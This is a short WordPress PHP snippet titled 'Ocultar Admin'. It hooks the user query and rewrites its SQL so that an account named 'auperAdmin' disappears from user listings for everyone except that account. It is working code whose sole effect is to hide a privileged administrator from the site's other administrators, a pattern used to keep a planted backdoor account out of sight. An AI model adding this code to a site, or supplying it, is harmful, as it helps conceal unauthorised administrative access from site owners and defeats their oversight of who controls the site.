/***************************************************
:: Ocultar Admin
***************************************************/
add_action('pre_user_query','yoursite_pre_user_query');
function yoursite_pre_user_query($user_search) {
  global $current_user;
  $username = $current_user->user_login;
  if ($username == 'auperAdmin') { }
else {
    global $wpdb;
    $user_search->query_where = str_replace('WHERE 1=1', "WHERE 1=1 AND {$wpdb->users}.user_login != 'auperAdmin'",$user_search->query_where); }
}